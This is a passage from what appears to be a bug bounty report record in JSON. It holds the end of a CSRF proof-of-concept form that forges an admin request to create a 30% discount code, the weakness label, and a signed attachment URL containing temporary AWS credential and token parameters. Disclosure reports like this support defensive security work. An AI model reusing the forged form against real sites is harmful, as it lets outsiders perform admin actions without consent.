1/admin/settings/discount/create\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"code\" value=\"CSRF\u0026#45;CODE\u0026#45;DEMO\" /\u003e\n      \u003cinput type=\"hidden\" name=\"type\" value=\"percent\" /\u003e\n      \u003cinput type=\"hidden\" name=\"value\" value=\"30\" /\u003e\n      \u003cinput type=\"hidden\" name=\"start\" value=\"21\u0026#47;02\u0026#47;2020\u0026#32;14\u0026#58;32\" /\u003e\n      \u003cinput type=\"hidden\" name=\"end\" value=\"22\u0026#47;02\u0026#47;2020\u0026#32;14\u0026#58;32\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\n# Wrap up\n\n\u003e Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: [Y/N]  N\n- I opened an issue in the related repository: [Y/N]  N\n\n\u003e Hunter's comments and funny memes goes here\n\n## Impact\n\nattacker can do admin privileges","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":722708,"file_name":"csrf.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NrdLGkoGFpYoBfN6yphTwPN3?response-content-disposition=attachment%3B%20filename%3D%22csrf.mp4%22%3B%20filename%2A%3DUTF-8%27%27csrf.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTXYB6XWG%2F20260429%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20260429T085329Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIHgZTuTPC4%2FvmfslKNTH0o6UiyapN41%2BPPU%2BL92PTBArAiEAxS9P2Isql2zwDGasPP5X1J%2B2lNMo6F6x6cYukOOjZRYqugUI8v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJmMxQKiVUcgGghlDCqOBedANC2BEEr5TBBVIK2x9RZc%2F%2Bt0pa6VSvjJSSTUh%2FS0r4N%2BRRD1JcW1uLKfVw4qKoeTxDKRRl1cKLDLipmSbt9Q2tQHvQ%2BKxjGmDEWFiUYybuQ4WtdnEr%2FQE8hWWZqNzb2ElLZ4fRxFmQlaWqmbmt24bBKKou4